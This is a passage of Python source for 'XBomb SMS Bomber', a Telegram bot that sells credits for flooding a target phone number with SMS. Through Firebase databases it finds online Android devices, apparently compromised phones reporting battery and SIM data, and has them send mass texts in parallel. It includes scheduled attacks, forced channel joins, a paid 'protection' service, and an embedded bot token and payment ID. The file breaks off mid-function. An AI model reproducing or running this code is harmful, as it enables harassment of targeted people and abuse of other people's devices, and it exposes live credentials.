import asyncio
import json
import os
import re
import time
import logging
import random
import string
import aiohttp
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("XBombSMS")

# ════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════
BOT_TOKEN = "8805382482:AAEbND-JtHZO-y9y-cNrod9aWthyTTdi_-w"
OWNER_ID = 8679787798
OWNER_USERNAME = "@TheLost_Owner"
DATA_FILE = "xbomb_data.json"
VERSION = "v6.2"
MAX_CONCURRENT = 500
MAX_COUNT = 500
REFERRAL_EXPIRY_HOURS = 24

BOMBING_DELAY_BASE = 0.005
BOMBING_DELAY_FAST = 0.003
BOMBING_DELAY_ULTRA = 0.001
MAX_CONCURRENT_REQUESTS = 20

FORCE_JOIN_CHANNELS = ["@errorarmy1", "@astrobaxkup"]
PROTECTION_PRICE = "30 Rs"
PAYMENT_UPI = "8707210511@fam"

# ════════════════════════════════════════════════════════════
# PREMIUM CUSTOM EMOJIS (Credotask Style)
# ════════════════════════════════════════════════════════════
CUSTOM_EMOJIS = {
    "fire":       ("🔥", "6235628846855492222"),
    "bolt":       ("⚡", "5456140674028019486"),
    "diamond":    ("💎", "5427168083074628963"),
    "check":      ("✅", "6084779072750097974"),
    "cross":      ("❌", "5210952531676504517"),
    "arrow":      ("🔙", "5253997076169115797"),
    "warn":       ("⚠️", "4958534696645428119"),
    "gift":       ("🎁", "6093890283227848557"),
    "crown":      ("👑", "6237864166879663987"),
    "shield":     ("🛡️", "4958900559139570572"),
    "money":      ("💵", "5321506952675597305"),
    "clock":      ("🕐", "6242510612824332116"),
    "star":       ("⭐", "6237702328216982810"),
    "link":       ("🔗", "4958689671950369798"),
    "eyes":       ("👀", "5210956306952758910"),
    "info":       ("ℹ️", "4958529074533238201"),
    "loud":       ("📣", "6242353099193718277"),
    "pin":        ("📌", "5397782960512444700"),
    "code":       ("💎", "5427168083074628963"),
    "admin":      ("👑", "6237864166879663987"),
    "delete":     ("🗑", "5445267414562389170"),
    "blocked":    ("🚫", "5240241223632954241"),
}

# ════════════════════════════════════════════════════════════
# TEXT & EMOJI HELPERS (Credotask Style)
# ════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
    'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
    'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ',
    'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
}

DIV = "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>"
DIV2 = "<b>────────────────────────</b>"

def sc(text: str) -> str:
    """convert to small caps (preserves HTML tags)"""
    if not isinstance(text, str):
        return str(text)
    parts = re.split(r'(<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)

def tc(text: str) -> str:
    """Title Case for buttons"""
    if not text:
        return text
    words = text.split()
    result = []
    for w in words:
        if len(w) <= 2 and w.isupper():
            result.append(w)
        else:
            result.append(w[0].upper() + w[1:].lower() if len(w) > 1 else w.upper())
    return " ".join(result)

def B(t):
    """bold"""
    return f"<b>{t}</b>"

def C(t):
    """code block"""
    return f"<code>{t}</code>"

def ce(key: str) -> str:
    """custom emoji - returns html with fallback"""
    if key not in CUSTOM_EMOJIS:
        return "❓"
    fallback, eid = CUSTOM_EMOJIS[key]
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

def styled_box(title: str, body: str) -> str:
    """credotask-style message box with dividers"""
    t = f"{ce('fire')} {B(sc(title))}"
    return f"{DIV}\n{t}\n{DIV2}\n{body}\n{DIV}"

async def animate_edit(msg: types.Message, text: str, duration: int = 2):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(duration * 5):
        try:
            await msg.edit_text(f"<code>{frames[i % 10]}</code> {text}", parse_mode="HTML")
        except:
            pass
        await asyncio.sleep(0.2)

# ════════════════════════════════════════════════════════════
# BUTTON BUILDERS (Credotask Style)
# ════════════════════════════════════════════════════════════
def mk_btn(text: str, callback: str = None, url: str = None, emoji_key: str = None, style: str = None) -> InlineKeyboardButton:
    """Create InlineKeyboardButton with custom emoji and style (Bot API 9.4+)"""
    kwargs = {"text": tc(text)}
    if callback:
        kwargs["callback_data"] = callback
    if url:
        kwargs["url"] = url
    if emoji_key and emoji_key in CUSTOM_EMOJIS:
        try:
            _, eid = CUSTOM_EMOJIS[emoji_key]
            kwargs["icon_custom_emoji_id"] = eid
        except Exception:
            pass
    # Add button style (primary, danger, success) — Bot API 9.4+
    if style:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def btn_primary(text, callback=None, url=None, emoji_key="bolt"):
    return mk_btn(text, callback, url, emoji_key, style="primary")

def btn_success(text, callback=None, url=None, emoji_key="check"):
    return mk_btn(text, callback, url, emoji_key, style="success")

def btn_danger(text, callback=None, url=None, emoji_key="cross"):
    return mk_btn(text, callback, url, emoji_key, style="danger")

def btn_red(text, callback=None, url=None, emoji_key="fire"):
    """Red button (danger style)"""
    return mk_btn(text, callback, url, emoji_key, style="danger")

def btn_blue(text, callback=None, url=None, emoji_key="bolt"):
    """Blue button (primary style)"""
    return mk_btn(text, callback, url, emoji_key, style="primary")

def btn_green(text, callback=None, url=None, emoji_key="gift"):
    """Green button (success style)"""
    return mk_btn(text, callback, url, emoji_key, style="success")

def kb(rows):
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            if isinstance(item, InlineKeyboardButton):
                btn_row.append(item)
            elif isinstance(item, tuple) and len(item) >= 2:
                btn_row.append(btn_primary(item[0], callback=item[1]))
        if btn_row:
            keyboard.append(btn_row)
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def back_button(callback="home"):
    return kb([[btn_primary("Back", callback=callback, emoji_key="arrow")]])

# ════════════════════════════════════════════════════════════
# FSM
# ════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    admin_add_id = State()
    ban_user_id = State()
    schedule_number = State()
    schedule_message = State()
    schedule_count = State()
    schedule_time = State()
    protect_txn = State()
    protect_number = State()
    generate_code_name = State()
    generate_code_sms = State()
    generate_code_days = State()
    generate_code_attacks = State()
    generate_code_maxusers = State()
    redeem_code_input = State()
    broadcast_message = State()
    premium_custom_amount = State()

# ════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID],
        "firebases": [],
        "banned": [],
        "schedules": [],
        "protected_numbers": [],
        "protection_requests": [],
        "users": {},
        "redeem_codes": [],
        "credit_requests": [],
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0},
    }

def load():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
            for k, v in default_data().items():
                if k not in d:
                    d[k] = v
            return d
    except Exception as e:
        log.error(f"load error: {e}")
    return default_data()

def save(d):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(d, f, indent=2)
    except Exception as e:
        log.error(f"save error: {e}")

def is_admin(uid, d): return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])

def get_user(d, uid):
    s = str(uid)
    if s not in d["users"]:
        d["users"][s] = {
            "daily_attacks": 0, "last_reset": datetime.now().isoformat(),
            "total_attacks": 0, "total_sent": 0, "referrals": 0,
            "referred_by": None, "bonus_attacks": 0, "referral_bonus_expiry": None,
            "credits": 1000,  # Welcome bonus: 1000 credits
        }
        save(d)
    return d["users"][s]

def check_ref_expiry(u):
    exp = u.get("referral_bonus_expiry")
    if not exp:
        return
    try:
        if datetime.now() >= datetime.fromisoformat(exp):
            u["bonus_attacks"] = 0
            u["referral_bonus_expiry"] = None
    except:
        pass

def reset_daily(u):
    try:
        if datetime.now().date() > datetime.fromisoformat(u["last_reset"]).date():
            u["daily_attacks"] = 0
            u["last_reset"] = datetime.now().isoformat()
    except:
        pass

# ════════════════════════════════════════════════════════════
# FORCE JOIN
# ════════════════════════════════════════════════════════════
async def check_fj(bot, user_id, channels):
    if not channels:
        return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ["left", "kicked", None]:
                return False
        except:
            return False
    return True

async def send_fj_ui(event, channels):
    text = styled_box("ᴍᴀɴᴅᴀᴛᴏʀʏ ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ",
        f"{ce('bell')} {sc('ʏᴏᴜ ᴍᴜꜱᴛ ᴊᴏɪɴ ᴛʜᴇꜱᴇ ᴄʜᴀɴɴᴇʟꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:')}\n")
    kb_rows = []
    for i, ch in enumerate(channels):
        text += f"{ce('link')} <code>{ch}</code>\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        kb_rows.append([btn_primary(f"Join Channel {i+1}", url=url, emoji_key="rocket")])
    kb_rows.append([btn_success("Verify Membership", callback="fj_verify", emoji_key="check")])
    markup = InlineKeyboardMarkup(inline_keyboard=kb_rows)
    if isinstance(event, types.Message):
        await event.answer(text, reply_markup=markup, parse_mode="HTML")
    else:
        await event.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# FIREBASE
# ════════════════════════════════════════════════════════════
async def fb_get(base, path, api_key=""):
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=10) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt in ("null", "") else json.loads(txt)
    except Exception as e:
        log.error(f"fb_get: {e}")
    return {}

async def fb_put(base, path, payload, api_key=""):
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.put(url, json=payload, timeout=8) as r:
                return 200 <= r.status < 300
    except Exception as e:
        log.debug(f"fb_put: {e}")
    return False

def is_device_online(dd):
    for f in ["isOnline", "online", "connected", "status"]:
        if f in dd and dd[f] in (True, 1, "online", "active", "true", "True"):
            return True
    return "battery" in dd or "sims" in dd

async def discover_online_devices(fb):
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict):
        return []
    out = []
    for did, dd in data.items():
        if not is_device_online(dd): continue
        sims = dd.get("sims") or [{"simSlotIndex": 0, "phoneNumber": dd.get("phoneNumber", "")}]
        for sim in sims:
            out.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": did, "device_name": dd.get("deviceName", did),
                "sim_slot": sim.get("simSlotIndex", 0), "phone_number": sim.get("phoneNumber", ""),
                "battery": dd.get("battery", 0),
            })
    return out

async def discover_all_devices(firebases):
    results = await asyncio.gather(*[discover_online_devices(fb) for fb in firebases], return_exceptions=True)
    all_d = []
    for r in results:
        if isinstance(r, list): all_d.extend(r)
    return all_d

async def send_sms(dev, to, msg):
    payload = {
        "from": dev["sim_slot"], "to": to.strip(), "message": msg.strip(),
        "isSended": False, "timestamp": int(time.time()),
        "deviceId": dev["device_id"], "simSlot": dev["sim_slot"],
    }
    return await fb_put(dev["fb_url"], f"/clients/{dev['device_id']}/webhookEvent/sendSms.json", payload, dev.get("api_key", ""))

_bombing_tasks = {}
_bombing_status = {}

async def bomber_worker(bot, uid, number, message, count, sched_id=None):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await bot.send_message(uid, styled_box("ᴇʀʀᴏʀ", f"{ce('warn')} {sc('ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ᴄᴏɴꜰɪɢᴜʀᴇᴅ.')}"), parse_mode="HTML")
        return

    status = await bot.send_message(uid, f"{ce('eyes')} {sc('ꜱᴄᴀɴɴɪɴɢ ɴᴏᴅᴇꜱ...')}", parse_mode="HTML")
    await animate_edit(status, sc("ᴅɪꜱᴄᴏᴠᴇʀɪɴɢ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ..."), 2)

    devices = await discover_all_devices(fbs)
    if not devices:
        await status.edit_text(styled_box("ᴇʀʀᴏʀ", f"{ce('warn')} {sc('ɴᴏ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ ꜰᴏᴜɴᴅ.')}"), parse_mode="HTML")
        return

    await status.edit_text(
        styled_box("ᴘʀᴇᴘᴀʀɪɴɢ ꜱᴛʀɪᴋᴇ",
        f"{ce('rocket')} {sc('ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(devices)}</b>\n"
        f"{ce('pin')} {sc('ᴄᴏᴜɴᴛ')}: <b>{count}</b>\n"
        f"{ce('link')} {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n\n"
        f"<i>{sc('ʟᴀᴜɴᴄʜɪɴɢ ɪɴ 1 ꜱᴇᴄᴏɴᴅ...')}</i>"), parse_mode="HTML")
    await asyncio.sleep(1)

    sent = failed = 0
    start = time.time()
    _bombing_status[uid] = {"total": count, "sent": 0, "failed": 0, "devices": len(devices),
                            "start": start, "running": True, "number": number, "schedule": sched_id}

    total_dev = len(devices)
    dev_idx = 0
    last_prog = -1
    bar_len = 20

    async def batch(n):
        nonlocal sent, failed, dev_idx
        tasks = []
        for _ in range(n):
            dev = devices[dev_idx % total_dev]
            dev_idx += 1
            tasks.append(send_sms(dev, number, message))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception) or not r:
                failed += 1
            else:
                sent += 1

    remaining = count
    while remaining > 0:
        if uid in _bombing_tasks and _bombing_tasks[uid].cancelled():
            await bot.send_message(uid, f"{ce('cross')} {sc('ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ.')}", parse_mode="HTML")
            break
        cur = min(MAX_CONCURRENT_REQUESTS, remaining)
        await batch(cur)
        remaining -= cur
        _bombing_status[uid]["sent"] = sent
        _bombing_status[uid]["failed"] = failed
        prog = min(100, int((sent + failed) / count * 100))
        if prog != last_prog:
            last_prog = prog
            filled = int(bar_len * prog / 100)
            bar = "▰" * filled + "▱" * (bar_len - filled)
            elapsed = int(time.time() - start)
            rate = (sent + failed) / elapsed if elapsed else 0
            eta = int((count - sent - failed) / rate) if rate > 0 else 0
            try:
                await status.edit_text(
                    styled_box("ʙᴏᴍʙɪɴɢ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ",
                    f"{ce('fire')} {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n"
                    f"{ce('green')} {sc('ꜱᴇɴᴛ')}: <b>{sent}</b> | {ce('red')} {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
                    f"{ce('chart')} <code>{bar}</code> {prog}%\n"
                    f"{ce('clock')} {sc('ᴇᴛᴀ')}: {eta}ꜱ | {sc('ᴛɪᴍᴇ')}: {elapsed}ꜱ\n\n"
                    f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ')}</i>"), parse_mode="HTML")
            except:
                pass
        await asyncio.sleep(BOMBING_DELAY_ULTRA if prog > 60 else BOMBING_DELAY_FAST if prog > 30 else BOMBING_DELAY_BASE)

    _bombing_status[uid]["running"] = False
    d = load()
    d["stats"]["total_sent"] += sent
    d["stats"]["total_failed"] += failed
    d["stats"]["total_bombings"] += 1
    u = get_user(d, uid)
    u["daily_attacks"] += 1
    u["total_attacks"] += 1
    u["total_sent"] += sent
    
    # Deduct credits: 2 per message sent
    cost = (sent + failed) * 2  # Total messages attempted (sent + failed)
    u["credits"] = u.get("credits", 0) - cost
    save(d)

    elapsed = int(time.time() - start)
    rate = round(sent / (sent + failed) * 100, 1) if sent + failed else 0
    try:
        await bot.send_message(uid,
            styled_box("ᴍɪꜱꜱɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ",
            f"{ce('fire')} {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n"
            f"{ce('green')} {sc('ꜱᴇɴᴛ')}: <b>{sent}</b>\n"
            f"{ce('red')} {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
            f"{ce('clock')} {sc('ᴛɪᴍᴇ')}: {elapsed}ꜱ\n"
            f"{ce('chart')} {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{rate}%</b>"), parse_mode="HTML")
    except:
        await bot.send_message(uid, f"Sent: {sent}, Failed: {failed}")

    if uid in _bombing_tasks:
        del _bombing_tasks[uid]

async def start_bombing(bot, uid, number, message, count, sched_id=None):
    if uid in _bombing_tasks:
        _bombing_tasks[uid].cancel()
        await asyncio.sleep(0.3)
    t = asyncio.create_task(bomber_worker(bot, uid, number, message, count, sched_id))
    _bombing_tasks[uid] = t
    return t

def stop_bombing(uid):
    if uid in _bombing_tasks:
        _bombing_tasks[uid].cancel()
        del _bombing_tasks[uid]
        return True
    return False

# ════════════════════════════════════════════════════════════
# SCHEDULER
# ════════════════════════════════════════════════════════════
def parse_time_string(s):
    s = s.strip().lower()
    m = re.findall(r'(\d+)([dhm])', s)
    if m:
        total = 0
        for v, u in m:
            total += int(v) * (86400 if u == 'd' else 3600 if u == 'h' else 60)
        return total
    if s.endswith('m'): return int(s[:-1]) * 60
    if s.endswith('h'): return int(s[:-1]) * 3600
    if s.endswith('d'): return int(s[:-1]) * 86400
    try: return int(s) * 60
    except: return 0

async def schedule_worker(bot):
    while True:
        try:
            d = load()
            for s in d.get("schedules", []):
                if s.get("status") != "pending": continue
                try:
                    if datetime.now() >= datetime.fromisoformat(s["time"]):
                        s["status"] = "done"
                        save(d)
                        await start_bombing(bot, OWNER_ID, s["number"], s["message"], s["count"], s["id"])
                except:
                    continue
            await asyncio.sleep(10)
        except Exception as e:
            log.error(f"scheduler: {e}")
            await asyncio.sleep(30)

# ════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════
R = Router()

# ── Main Menu ─────────────────────────────────────────────
def main_menu(uid, d):
    rows = []
    if is_admin(uid, d):
        rows.append([btn_red("Admin Panel", callback="admin:panel", emoji_key="crown")])
    # Full-width red button
    rows.append([btn_red("Custom SMS Send", callback="bomb:start", emoji_key="code")])
    # Blue buttons row
    rows.append([
        btn_blue("👑 Bot Statistics", callback="stats:show", emoji_key="crown"),
        btn_blue("Referral", callback="refer:show", emoji_key="gift"),
    ])
    # Green and red buttons row
    rows.append([
        btn_green("Promo Code", callback="redeem:menu", emoji_key="gift"),
        btn_red("Faqs", callback="help:show", emoji_key="info"),
    ])
    # Full-width green button
    rows.append([btn_green("Buy Premium (INR ₹)", callback="premium:buy", emoji_key="gift")])
    
    return kb(rows)

def admin_panel_kb(d):
    pending = len([r for r in d.get("protection_requests", []) if r["status"] == "pending"])
    return kb([
        [btn_primary("Add Firebase", callback="admin:fb_add", emoji_key="fire"),
         btn_primary("List Nodes", callback="admin:fb_list", emoji_key="link")],
        [btn_primary("Schedule Bomb", callback="admin:schedule", emoji_key="date"),
         btn_primary("Manage Schedules", callback="admin:schedule_list", emoji_key="chart")],
        [btn_primary(f"Protection ({pending})", callback="admin:protection", emoji_key="shield")],
        [btn_primary("Live Status", callback="admin:status", emoji_key="satellite"),
         btn_primary("Global Stats", callback="admin:stats", emoji_key="chart")],
        [btn_primary("Admins", callback="admin:admins", emoji_key="crown")],
        [btn_danger("Ban User", callback="admin:ban", emoji_key="cross"),
         btn_success("Unban User", callback="admin:unban", emoji_key="check")],
        [btn_primary("Generate Code", callback="admin:generate_code", emoji_key="diamond"),
         btn_primary("Code History", callback="admin:code_history", emoji_key="info")],
        [btn_primary("Backup / Restore", callback="admin:db_tools", emoji_key="diamond")],
        [btn_primary("Broadcast", callback="admin:broadcast", emoji_key="loud")],
        [btn_danger("Back", callback="home", emoji_key="arrow")],
    ])

# ── /start ────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    user_name = msg.from_user.first_name or msg.from_user.username or str(uid)

    args = msg.text.split()
    if len(args) > 1:
        try:
            ref_uid = int(args[1])
            if ref_uid != uid:
                u = get_user(d, uid)
                if not u.get("referred_by"):
                    # Check if referred user joined force join channels first
                    if await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
                        u["referred_by"] = ref_uid
                        u["referrals"] += 1
                        ru = get_user(d, ref_uid)
                        ru["bonus_attacks"] += 1
                        ru["referrals"] += 1
                        ru["credits"] = ru.get("credits", 0) + 500  # Add 500 credits to referrer
                        ru["referral_bonus_expiry"] = (datetime.now() + timedelta(hours=REFERRAL_EXPIRY_HOURS)).isoformat()
                        save(d)
                        try:
                            await msg.bot.send_message(ref_uid,
                                styled_box("ʀᴇꜰᴇʀʀᴀʟ ʀᴇᴡᴀʀᴅ",
                                f"{ce('gift')} {sc(f'{user_name} ᴊᴏɪɴᴇᴅ ᴜꜱɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ!')}\n"
                                f"{ce('fire')} {sc('ʙᴏɴᴜꜱ')}: <b>+1 ᴀᴛᴛᴀᴄᴋ</b>\n"
                                f"{ce('gift')} {sc('ᴄʀᴇᴅɪᴛꜱ')}: <b>+500 ᴄʀᴇᴅɪᴛꜱ</b>"), parse_mode="HTML")
                        except: pass
        except: pass

    if is_banned(uid, d):
        await msg.answer(f"{ce('cross')} {sc('ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ.')}", parse_mode="HTML")
        return

    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
        return

    u = get_user(d, uid)
    reset_daily(u)
    check_ref_expiry(u)
    save(d)

    text = (
        f"{DIV}\n"
        f"{ce('code')} <b>XBOMB SMS BOMBER</b>\n"
        f"{DIV2}\n\n"
        f"{ce('eyes')} <b>Custom SMS</b>\n"
        f"{ce('link')} Number → {ce('code')} Message → {ce('rocket')} Send\n"
        f"{DIV2}\n\n"
        f"{ce('bolt')} <b>Active Plan:</b> <code>FREE</code>\n"
        f"{ce('gift')} <b>Credits:</b> <code>{u.get('credits', 0)}</code>\n"
        f"{ce('money')} <b>Cost per SMS:</b> <code>2 Credits</code>\n"
        f"{DIV2}\n\n"
        f"{ce('link')} <b>Invite Link:</b>\n"
        f"<code>https://t.me/xbomb_sms_bot?start={uid}</code>\n"
        f"{DIV2}\n\n"
        f"{ce('gift')} <b>Earn by Inviting Friends!</b>\n"
        f"{DIV}\n"
    )
    await msg.answer(text, reply_markup=main_menu(uid, d), parse_mode="HTML")

@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    if stop_bombing(msg.from_user.id):
        await msg.answer(f"{ce('cross')} {sc('ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ.')}", parse_mode="HTML")
    else:
        await msg.answer(f"{ce('info')} {sc('ɴᴏ ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙɪɴɢ.')}", parse_mode="HTML")

@R.message(Command("cancel"))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    await state.clear()
    await msg.answer(f"{ce('cross')} {sc('ᴄᴀɴᴄᴇʟʟᴇᴅ.')}", parse_mode="HTML")

@R.message(Command("redeem"))
async def cmd_redeem(msg: types.Message, state: FSMContext):
    await state.set_state(Form.redeem_code_input)
    await msg.answer(styled_box("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ", f"{ce('diamond')} {sc('ꜱᴇɴᴅ ʏᴏᴜʀ ᴄᴏᴅᴇ')}"), parse_mode="HTML")

# ── Callbacks ─────────────────────────────────────────────
@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery, state: FSMContext):
    if await check_fj(cq.bot, cq.from_user.id, FORCE_JOIN_CHANNELS):
        await cq.answer(sc("ᴠᴇʀɪꜰɪᴇᴅ!"), show_alert=True)
        await cb_home(cq, state)
    else:
        await cq.answer(sc("ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!"), show_alert=True)

@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext = None):
    if state:
        await state.clear()
    uid = cq.from_user.id
    d = load()
    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return
    u = get_user(d, uid)
    reset_daily(u)
    check_ref_expiry(u)
    save(d)
    user_name = cq.from_user.first_name or cq.from_user.username or str(uid)
    text = (
        f"{DIV}\n"
        f"{ce('code')} <b>XBOMB SMS BOMBER</b>\n"
        f"{DIV2}\n\n"
        f"{ce('eyes')} <b>Custom SMS</b>\n"
        f"{ce('link')} Number → {ce('code')} Message → {ce('rocket')} Send\n"
        f"{DIV2}\n\n"
        f"{ce('bolt')} <b>Active Plan:</b> <code>FREE</code>\n"
        f"{ce('gift')} <b>Credits:</b> <code>{u.get('credits', 0)}</code>\n"
        f"{ce('money')} <b>Cost per SMS:</b> <code>2 Credits</code>\n"
        f"{DIV2}\n\n"
        f"{ce('link')} <b>Invite Link:</b>\n"
        f"<code>https://t.me/xbomb_sms_bot?start={uid}</code>\n"
        f"{DIV2}\n\n"
        f"{ce('gift')} <b>Earn by Inviting Friends!</b>\n"
        f"{DIV}\n"
    )
    await cq.message.edit_text(text, reply_markup=main_menu(uid, d), parse_mode="HTML")
    await cq.answer()

@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery):
    await cq.answer()
    text = styled_box("ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛʀᴀʟ",
        f"{ce('one')} {sc('ᴛᴀᴘ ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ')}\n"
        f"{ce('two')} {sc('ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ')}\n"
        f"{ce('three')} {sc('ᴇɴᴛᴇʀ ᴍᴇꜱꜱᴀɢᴇ')}\n"
        f"{ce('four')} {sc('ᴇɴᴛᴇʀ ᴄᴏᴜɴᴛ (ᴍᴀx 500)')}\n\n"
        f"{ce('fire')} {sc('ꜰᴇᴀᴛᴜʀᴇꜱ')}\n"
        f"{ce('green')} {sc('ᴀᴜᴛᴏ-ᴅɪꜱᴄᴏᴠᴇʀ ᴅᴇᴠɪᴄᴇꜱ')}\n"
        f"{ce('green')} {sc('ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅɪɴɢ')}\n"
        f"{ce('green')} {sc('ʀᴇᴀʟ-ᴛɪᴍᴇ ᴘʀᴏɢʀᴇꜱꜱ')}\n"
        f"{ce('green')} {sc('ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ')}")
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

@R.callback_query(F.data == "status:show")
async def cb_status(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("ɴᴏ ɴᴏᴅᴇꜱ ᴄᴏɴꜰɪɢᴜʀᴇᴅ"), show_alert=True)
        return
    await cq.answer(sc("ꜱᴄᴀɴɴɪɴɢ..."))
    await animate_edit(cq.message, sc("ꜱʏɴᴄɪɴɢ..."), 2)
    devices = await discover_all_devices(fbs)
    text = styled_box("ʟɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ",
        f"{ce('eyes')} {sc('ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(devices)}</b>\n")
    for i, fb in enumerate(fbs):
        cnt = len([x for x in devices if x["fb_id"] == fb["id"]])
        text += f"{ce('fire')} {sc('ɴᴏᴅᴇ')} #{i+1}: {ce('green')} <b>{cnt}</b> {sc('ᴏɴʟɪɴᴇ')}\n"
    text += f"\n{ce('clock')} {sc('ʟᴀꜱᴛ ꜱʏɴᴄ')}: {datetime.now().strftime('%H:%M:%S')}"
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

@R.callback_query(F.data == "admin:status")
async def cb_admin_status(cq: types.CallbackQuery):
    await cb_status(cq)

@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    status = _bombing_status.get(uid, {})
    if status and status.get("running"):
        elapsed = int(time.time() - status.get("start", time.time()))
        text = styled_box("ᴀᴄᴛɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ",
            f"{ce('fire')} {sc('ᴛᴀʀɢᴇᴛ')}: <code>{status.get('number', '?')}</code>\n"
            f"{ce('green')} {sc('ꜱᴇɴᴛ')}: <b>{status.get('sent', 0)}</b>\n"
            f"{ce('red')} {sc('ꜰᴀɪʟᴇᴅ')}: <b>{status.get('failed', 0)}</b>\n"
